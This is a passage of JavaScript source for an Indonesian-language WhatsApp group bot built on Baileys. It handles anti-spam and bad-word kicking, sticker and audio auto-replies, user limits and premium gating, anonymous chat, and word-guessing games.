let iniSticker = (type == 'stickerMessage') ? m.message.stickerMessage.fileSha256.toString('base64') : ""
if(isGroup && isBotGroupAdmins  && antiSticker.includes(iniSticker)) hanz.sendMessage(from, { delete: m.key})
 
   // Function Loading
async function loading() {
    let emotLoad = ["🕛", "🕒", "💦"]; // Array of emoticons
    let index = 0; // Start from the first emoticon

    let intervalId = setInterval(async () => {
        if (index < emotLoad.length) {
            // Send the current emoticon as a reaction
            await hanz.sendMessage(from, { react: { text: emotLoad[index], key: m.key } });
            index++; // Move to the next emoticon
        } else {
            // Stop when all emoticons are sent
            clearInterval(intervalId);
        }
    }, 1000); // 1000ms (1 second) delay between each emoticon
}

  ////Total fitur by Official Dittaz
const totalFitur = () =>{
var mytext = fs.readFileSync("./message/case.js").toString()
var numUpper = (mytext.match(/case/g) || []).length;
return numUpper
}
//AUTO SEND STICKER 
if(db.data.sticker[budy]){ 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "5s", AntiSpam)
hanz.sendMessage(from,{sticker:{url:db.data.sticker[budy].link}}, {quoted: m})
}
//AUTO SEND VN/AUDIO
if(db.data.audio[budy]) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
 let nono =  {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${db.data.audio[budy].name}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const iniQuoted = mentionByReply? m.quoted.fakeObj : nono 
hanz.sendMessage(from, {audio: {url: db.data.audio[budy].link},ptt: true, waveform:  [
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  9,
35, 51, 67, 73, 73, 25, 18, 58, 75, 72, 26,  0,
27, 56, 58, 43, 12, 23, 35, 49, 62, 67, 63, 18,
2, 16, 39, 45, 43, 31, 21, 36, 57, 71, 70, 67,
23, 49, 36,  6, 17, 39, 50, 52, 45, 27, 26, 50,
51, 49, 49, 49
], mimetype: 'audio/mpeg'}, {quoted: iniQuoted }) 
addSpam("NotCase",senderNumber, "5s", AntiSpam)
}
// AUTO RESPON VIDEO
if (videonya.includes(messagesC)) {
  let namastc = messagesC;
  let buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`); // Ubah ekstensi dan jalur ke video
  hanz.sendMessage(from, { video: buffer }, { quoted: m });
}

//AUTO RESPON IMAGE
if(imagenya.includes(messagesC)){
let namastc = messagesC
let buffer = fs.readFileSync(`./temp/image/${namastc}.jpg`)
hanz.sendMessage(from, {image: buffer}, {quoted:m })
}
//AUTO HIT
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`  
if(isCmd){
db.data.users[sender].hit += 1
cmdAdd("run", "1d", hitnya)
Succes(toFirstCase(command), dash, allcommand)
}

global.thisHit = thisHit



//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: pushname, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await hanz.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

/* AUTO CLEAR SESSION */
setInterval(() => {
  fs.readdir("./session", async function (err, files) {
    if (err) {
      console.log('Unable to scan directory: ' + err);
      return;
    }

    let filteredArray = await files.filter(item => 
      item.startsWith("pre-key") ||
      item.startsWith("sender-key") || 
      item.startsWith("session-") || 
      item.startsWith("app-state")
    );

    if (filteredArray.length === 0) return;

    await filteredArray.forEach(function (file) {
      fs.unlinkSync(`./session/${file}`);
    });

    console.log('Hapus Session nahida setiap 12 jam');
  });
}, 43200000); // 12 jam dalam milidetik

//ADD SPAM
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}
//NEW ANTI SPAM
hanz.spam = hanz.spam || {}; // Inisialisasi objek spam jika belum ada
if (chat && chat.antispam) {
  if (m.sender in hanz.spam) {
    hanz.spam[m.sender].count++;

    if (m.messageTimestamp.toNumber() - hanz.spam[m.sender].lastspam > 5) { // Batas waktu 5 detik
      if (hanz.spam[m.sender].count > 7) { // Batas jumlah pesan spam sebelum di-kick
        // Tindakan untuk memproses kick pengguna yang terdeteksi spam
        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? hanz.user.jid : m.sender;
        let caption = `Terdeteksi mengirim spam berlebihan\nMaaf kamu akan di kick oleh Bot!`;
        let tekSpam = caption; // Buat teks spam
        hanz.parseMention(caption);

        sendButDoc(tekSpam, 'AntiSpam Off', 'antispam off'); // Kirim pesan ke grup

        if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin.`); // Cek apakah bot admin atau bukan

        await hanz.groupParticipantsUpdate(from, [m.sender], 'remove').catch((e) => {
          reply(`Tidak bisa kick karena bot bukan admin.`);
        });

        // Reset jumlah spam pengguna setelah di-kick
        hanz.spam[m.sender].count = 0;
        hanz.spam[m.sender].lastspam = m.messageTimestamp.toNumber();
      }
    }
  } else {
    // Inisialisasi entri baru di objek spam untuk pengguna yang belum terdeteksi spam sebelumnya
    hanz.spam[m.sender] = {
      jid: m.sender,
      count: 1, // Setel count ke 1 karena pesan pertama dianggap spam
      lastspam: m.messageTimestamp.toNumber()
    };
  }
}

//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}


SpamExpired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")),"antispam Case aktif")
return
}

//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "3s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "5s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`Kamu bukan user premium`)
}

//FITUR KHUSUS OWNER
if(!checkDataName("commands", "", DataId)) { 
await createDataId("commands", DataId) 

}

let ownerCommands =  DataId.filter(item => item.name == "commands" )
for(let i of ownerCommands[0].id){
if(command == i && !isOwner) return sendButDoc('Maaf Kak Fitu Ini Husus Owner Yang Bisa Menggunakan Nya','Owner','owner')
} 

// FITUR USER LIMIT
if (!checkDataName("limit", "", DataId)) { 
    await createDataId("limit", DataId);
}

let userLimit = DataId.filter(item => item.name == "limit");

for (let i of userLimit[0].id) {
    if (!isOwner && command == i) {
        if (!isPremium && db.data.users[sender].limit < 1) {
            let nolLmt = Ehztext(`Hai ${pushname} Limit kamu habis. Silakan klaim limit untuk mendapatkan lebih banyak limit.`);
            let { proto, generateWAMessageFromContent } = require('baileys');
            
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: nolLmt
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Pilih salah satu opsi di bawah ini untuk mendapatkan limit!"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: "Limit Kamu Habis!",
                                subtitle: "Ayo klaim limit sekarang!",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{"display_text":"🎁 CLAIM","id":"${prefix}claim"}`
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{"display_text":"📖 CARA DAPAT LIMIT","id":"${prefix}caradapetlimit"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, {});
            
            await hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
            return; // Hentikan proses jika limit habis
        }

        if (!isPremium) {
            db.data.users[sender].limit -= 1;
            hanz.sendMessage(from, {
                text: `🎐 Limit kamu tersisa ${db.data.users[sender].limit}.`
            }, { quoted: fkontak });
        }
    }
}

  
// USER AFK
    
if (user && user.afk > -1) {
  let udahAfk = Ehztext(`⚡ ${pushname} *telah kembali dari mode AFK!* ⚡\n${
    user.afkReason ? `🔹 *Alasan AFK*: ${user.afkReason}` : ''
  }\n🔸 *Durasi AFK*: ${clockString(new Date - user.afk)}`).trim();
  
setReply(udahAfk)
  // Reset status AFK
  user.afk = -1;
  user.afkReason = '';
}

// Mengecek siapa yang sedang AFK dan mengirimkan pesan untuk tidak mengganggu mereka
let jids = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])];
for (let jid of jids) {
  let userAfk = global.db.data.users[jid];
  if (!userAfk) continue;
  
  let afkTime = userAfk.afk;
  if (!afkTime || afkTime < 0) continue;
  
  let reason = userAfk.afkReason || '';
  let yoe = Ehztext(`🤫 *Ssssttt! Jangan tag dia!* 🤫\n💤 ${botName} memberitahukan bahwa dia sedang AFK!\n${
    reason ? `🔹 *Alasan AFK*: ${reason}` : '🔹 *Tanpa alasan khusus*'
  }\n⏳ *Durasi*: ${clockString(new Date - afkTime)}`).trim();
  m.reply(yoe)
} 
// ======== FUNCTION SEND VN ========//
//VN saat ada yang toxic
const anying = vnToxic
const astaga = anying[Math.floor(Math.random() * anying.length)]
//Vn Audio Menu
const vnme = vnMenu
const dmusic = vnme[Math.floor(Math.random() * vnme.length)]
//VN saat ada yg bilang bot
const ulul = vnBot
const halo = ulul[Math.floor(Math.random() * ulul.length)]

//VN saat ada yang ucap pagi
const oyo = vnPagi
const pagi = oyo[Math.floor(Math.random() * oyo.length)]

//VN saat ada yang ucap siang
const oyo1 = vnSiang
const siang = oyo1[Math.floor(Math.random() * oyo1.length)]

//VN saat ada yang ucap malam
const oyo2 = vnMalam
const malam = oyo2[Math.floor(Math.random() * oyo2.length)]

//VN saat ada yg akses fitur owner
const ahenggak = vnOwner
const gakmau = ahenggak[Math.floor(Math.random() * ahenggak.length)]

//VN saat ada yg spam
const alal = vnSpam
const nospam = alal[Math.floor(Math.random() * alal.length)]

//VN saat ada yg bilang asalamualaikum
const alul = vnSalam
const walaikumsalam = alul[Math.floor(Math.random() * alul.length)]

//VN saat ada yg bilang i love u
const awlu = vnLove
const lopyoutoo = awlu[Math.floor(Math.random() * awlu.length)]

//VN saat ada yg bilang ara
const ara = vnAra
const wibu = ara[Math.floor(Math.random() * ara.length)]

//VN kawai
const olah = vnKawai
const kawai = olah[Math.floor(Math.random() * olah.length)]

// ======= FUNCTION SEND STICKER =======//
//stik otw
const onde = stikOtw
const otw =
onde[Math.floor(Math.random() * onde.length)]
//stik spam
const spamm = stikSpam
const spamni =
spamm[Math.floor(Math.random() * spamm.length)]
//stik Tag Owner
const TagOwn = stikTagOwn
const TagOwner =
TagOwn[Math.floor(Math.random() * TagOwn.length)]
// ===== RESPON TEKS =====//
//respon teks
let listRespon = global.db.data.respon[body]
if(listRespon) m.reply(listRespon.respon)
//Teks Spam
const JanSpam = teksspam
const Teksspam = JanSpam[Math.floor(Math.random() * JanSpam.length)]


// ======= FUNCTION ONLY? =======//
//ONLY OWNER 
const onlyOwner = async() =>{
let tksOnr = `Maaf Kak ${pushname} Seperti nya Fitur Ini Husus Owner Saja 🙏`
sendButDoc(tksOnr,'OWNER','owner')
}
 //ONLY ADMIN
const onlyAdmin = async() =>{
 let nlyAdmn = `Maaf Kak ${pushname} Seperti nya Fitur Ini Husus Admin🙏`
 sendButDoc(nlyAdmn,'Tag Admin','tagadmin')
}
//ONLY BADMIN
const onlyBadmin = async() =>{
let bdmin = `HAI ${pushname} Silakan Jadikan ${botName} Admin Terlebih Dahulu Agar Bisa Memakai Fitur Tersebut`
sendButDoc(bdmin,'Tag Admin','tagadmin')
}
//ONLY PREMIUM 
const onlyPrem = async() =>{
let onlPrm = Ehztext(`Hallo ${pushname}\nFitur Hanya Untuk User Premium Silahkan Upgrade ke Premium Untuk Menggunakan Fitur Ini dengan Cara *.buyprem*`)
hanz.sendMessage(from, {
  image: { url: 'https://pomf2.lain.la/f/t3jqp4ej.jpg' }, 
  caption:onlPrm
}, { quoted: m });

}
//ONLY LIMIT
const onlyLimit = async() => {
let tekLmit = `*乂 Limit - Expired*

Maaf kak @${sender.split('@')[0]} limit kamu sudah habis!\nSilakan .ceklimit\nAtau *.claim* \n untuk buylimit ketik *.shopc*`
hanz.sendMessage(from, {
  image: { url: 'https://pomf2.lain.la/f/vw7dg14q.jpg' }, 
  caption:tekLmit
}, { quoted: m });

}
//ONLY GLIMIT
const onlyGlimit = async() => {
sendTolak(`*乂 Limit - Expired*
Maaf kak @${sender.split('@')[0]} limit game kamu sudah habis! silakan cek limit`)
}

//ONLY PRIVATE
const onlyPrivate = async() => {
let tekNya = Ehztext(`Hai ${pushname} command Ini Hanya Bisa Di Aksess Di Private Chat Bot`)
hanz.editmsg(m.chat,tekNya,m)
}

const onlyToko = async() => {
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("baileys")

let wek = Ehztext(`
👥 Info: Nama: ${pushname}
Saldo: Rp

🕒 Tanggal & Waktu: 
⬪ ${week}, ${calender}
⬪ ${timeWib} WIB
⬪ ${dateIslamic}

${gris}Selamat datang di akun resmi © ɴᴀʜɪᴅᴀ - ᴍᴅ! Kami dengan bangga memperkenalkan layanan unggulan kami kepada Anda. Nikmati fitur eksklusif yang hanya dapat diakses di chat pribadi ini. Untuk akses lebih lanjut, silakan bergabung di grup bot kami [ .gcrangel ].${gris}
`)



const caption = `${wek}`;
let sections = [
{
title: '🍱All Menu',
highlight_label: 'All Menu List',
rows: [{
title: 'Menu All',
description: `Menampilkan Semua Produk`, 
id: `${prefix}menu allproduk`
}]},
{
title: 'List Menu',
rows: [{
title: '👕pakaian',
description: `Menampilkan List Produk Pakaian`, 
id: `${prefix}menu pakaian`
},
{
title: '📡Panel Pterodactyl',
description: `Menampilkan fitur/harga Panel`, 
id: `${prefix}menu panel`
},
       {
title: '💸Top Up Payment',
description: `Menampilkan fitur top up payment `, 
id: `${prefix}menu topup`
},
{
title: '🧑‍💻Fitur Private', 
description: "Menampilkan Fitur Private", 
id: `${prefix}menu private`
}]
}]

let listMessage = {
    title: 'List Menu', 
    sections
};
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid:'120363284148189014@newsletter',
  serverMessageId: 100,
  newsletterName:nameToko
  },
 businessMessageForwardInfo: { businessOwnerJid: hanz.decodeJid(hanz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `_silakan di pilih kak...._`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "© ɴᴀʜɪᴅᴀ - ᴍᴅ",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image : {url : 'https://pomf2.lain.la/f/mm0k8nji.jpg'}}, { upload: hanz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
  "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Owner\",\"url\":\"https://wa.me//628388198229\",\"merchant_url\":\"https://wa.me//628388198229\"}"
     },
 ],
 })
 })
 }
 }
}, {})

if (!q) await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
let contextInfo = {
externalAdReply: {
showAdAttribution: false, 
renderLargerThumbnail : false,
title: `© ɴᴀʜɪᴅᴀ - ᴍᴅ `, 
body:  `${baileysVersion}`,
description: '',
mediaType: 2,
thumbnailUrl: "https://pomf2.lain.la/f/y60mzd6o.jpg",
mediaUrl: `${syt}`
}
}

if (args[0] === "allproduk") {
 const caption = `${wek}\n\n${readmore}\n\n${menutoko(prefix)}\n\n${menupanel(prefix)}\n\n${menutopup(prefix)}\n\n${menuprivate(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
 } else if (args[0] === 'pakaian') {
await sleep(1000) 
const caption = `${menutoko(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'panel') {
await sleep(1000) 
const caption = `${menupanel(prefix)}`;
hanz.sendMessage(m.chat, {
    text: caption,
    contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
    newsletterJid,
    serverMessageId: 100,
    newsletterName },
    externalAdReply: {  
    title: '乂 Panel Pterodactyl', 
    body: `${baileysVersion}`,
thumbnailUrl:'https://telegra.ph/file/e70e8fe24b00b683da77f.png',
    sourceUrl: global.sig, 
    mediaType: 1,
    renderLargerThumbnail: true
    }}}, {quoted: m})
} else if (args[0] === 'topup') {
await sleep(1000) 
const caption = `${menutopup(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
} else if (args[0] === 'private') {
await sleep(1000)
 const caption = `${menuprivate(prefix)}`;
hanz.sendMessage(from, {contextInfo,text:caption},{ quoted:m})
}}

//ANONYMOUS CHAT
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
//let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await hanz.sendMessage(room.a, {text:"Pesan rahasia telah keluar dari room chat"})
anonChat.splice(anonChat.indexOf(room, 1)) 
}
// =========== KEAMANAN ==≠=======//
//ANTI BADWORD 
if (isGroup ){ 
if (badword.includes(budy)) {
if (isCountKasar(sender, _toxic)){
if (!isBotGroupAdmins) return sendAnti(`Kamu beruntung karena bot bukan admin`)
sendAnti(`Sepertinya kamu sudah berkata kasar lebih dari 5x maaf kamu akan di kick`)
setReply('Hitungan mundur dalam waktu')
await sleep(1000)
hanz.sendMessage(m.chat, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true, text: `3` })
await sleep(2000)
hanz.sendMessage(m.chat, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true, text: `2` })
await sleep(3000)
hanz.sendMessage(m.chat, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true, text: `1` })
await sleep(4500)
hanz.sendMessage(m.chat, { id: m.key.id, contextInfo: { forwardingScore: 50, isForwarded: true },showAdAttribution: true, text: `Sayonaraa 👋` })
hanz.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`Bakaa aku bukan admin gimana mau kick`) })
delCountKasar(sender, _toxic)
} else {
addCountKasar(sender, _toxic)
reply(`Kamu terdeteksi berkata kasar! jangan ulangi lagi atau kamu akan dikick oleh bot`)
}
}
}

    // susunkata 
hanz.susunkata = hanz.susunkata ? hanz.susunkata : {};
hanz.susunkataCooldown = hanz.susunkataCooldown ? hanz.susunkataCooldown : {};
if (isGroup && from in hanz.susunkata) {
    if (!isGroup) return;
    const threshold = 0.72;
    let id = m.chat;
    let json = JSON.parse(JSON.stringify(hanz.susunkata[id][1]));
    if (hanz.susunkataCooldown[id]) {
        let lastInteraction = hanz.susunkataCooldown[id];
        if (new Date() - lastInteraction < 5000) {
            return; 
        }
    }
    hanz.susunkataCooldown[id] = new Date();
    if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
        user.balance += hanz.susunkata[id][2];
        let correctReplies = [
            `🎉 *GAME SUSUN KATA*\n\nJawaban Kamu Benar! 🎊\n\nHadiah: +${hanz.susunkata[id][2]} Money 💸\nExp: +999🆙`,
            `🔥 *GAME SUSUN KATA*\n\nLuar biasa! Kamu berhasil! 💪\n\nBonus: +${hanz.susunkata[id][2]} Money 💵\nExp: +999📈`,
            `✨ *GAME SUSUN KATA*\n\nKamu jago! Jawaban benar! 🎯\n\nBonus: +${hanz.susunkata[id][2]} Money 💸\nExp: +999🆙`
        ];
        let replyCorrect = pickRandom(correctReplies);
let { proto, generateWAMessageFromContent } = require('baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `${pushname}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: replyCorrect,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
                "buttonParamsJson": `{"display_text":"claim game ","id":"${prefix}claimgame"}`
     },{
 "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"main lagi ","id":"${prefix}susunkata"}`
     },
 ],
 })
 })
 }
 }
}, {})

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
      
        // Menghapus sesi permainan setelah jawaban benar
        clearTimeout(hanz.susunkata[id][3]);
        delete hanz.susunkata[id];
    // Jika jawaban mendekati benar (threshold similarity)
    } else if (similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) {
        let nearMissReplies = [
            `🤏 *Dikit Lagi!* Kamu hampir berhasil, coba lagi!`,
            `🧐 Hmm, sudah hampir benar! Ayo coba sekali lagi.`,
            `⏳ *Sedikit Lagi!* Jawabanmu hampir benar, ayo lanjutkan!`
        ];
        let replyNearMiss = pickRandom(nearMissReplies);
        reply(replyNearMiss);
    } else {
        let wrongReplies = [
            `❌ *Salah!* Jawabanmu masih kurang tepat, coba lagi ya!`,
            `🚫 *Oops!* Itu bukan jawaban yang benar, ayo coba lagi.`,
            `❓ *Belum benar!* Tetap semangat, terus coba, kamu pasti bisa!`
        ];
        let replyWrong = pickRandom(wrongReplies);
        reply(replyWrong);
    }
}
//GAME Tebak Bendera Function
hanz.tebakbendera = hanz.tebakbendera ? hanz.tebakbendera : {}  
if(isGroup && from in hanz.tebakbendera){
const similarity = require('similarity')
const threshold = 0.72
let id = from

 let json = JSON.parse(JSON.stringify(hanz.tebakbendera[id][1]))
 if (budy.toLowerCase() == json.name.toLowerCase().trim()) {
user.balance += hanz.tebakbendera[id][2]
let tebkTbenra = Ehztext(`*TEBAK BENDERA*

Jawaban Kamu Benar!
Bonus Saldo : +${hanz.tebakbendera[id][2]}
Exp : +999`)  
let { proto, generateWAMessageFromContent } = require('baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `${pushname}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: tebkTbenra,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
                "buttonParamsJson": `{"display_text":"claim game ","id":"${prefix}claimgame"}`
     },{
 "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"main lagi ","id":"${prefix}tebakbendera"}`
     },
 ],
 })
 })
 }
 }
}, {})

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
 clearTimeout(hanz.tebakbendera[id][3])
 delete hanz.tebakbendera[id]
 } else if(similarity(budy.toLowerCase(), json.name.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)

}
//GAME  teka teki Function
hanz.tekateki = hanz.tekateki ? hanz.tekateki : {}  
if(isGroup && from in hanz.tekateki){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tekateki[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += hanz.tekateki[id][2]
 let tekaTki = Ehztext (`*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tekateki[id][2]} Money 💸`)
 let { proto, generateWAMessageFromContent } = require('baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `${pushname}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: tekaTki,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
                "buttonParamsJson": `{"display_text":"claim game ","id":"${prefix}claimgame"}`
     },{
 "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"main lagi ","id":"${prefix}tekateki"}`
     },
 ],
 })
 })
 }
 }
}, {})

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
 clearTimeout(hanz.tekateki[id][3])
 delete hanz.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}
//GAME tebak kimia Function
hanz.tebakkimia = hanz.tebakkimia ? hanz.tebakkimia : {}  
if(isGroup && from in hanz.tebakkimia){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebakkimia[id][1]))
 let isSurender = /^((me)?nyerah|surr?ender)$/i.test(budy)

 if (budy.toLowerCase() == json.lambang.toLowerCase().trim()) {
user.balance += hanz.tebakkimia[id][2]
 global.db.data.users[m.sender].exp += 10
   let tebkKmia = Ehztext(`*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebakkimia[id][2]} Money 💸`)
 let { proto, generateWAMessageFromContent } = require('baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: null
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `${pushname}`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: tebkKmia,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
                "buttonParamsJson": `{"display_text":"claim game ","id":"${prefix}claimgame"}`
     },{
 "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"main lagi ","id":"${prefix}tebakkimia"}`
     },
 ],
 })
 })
 }
 }
}, {})

await hanz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
 clearTimeout(hanz.tebakkimia[id][3])
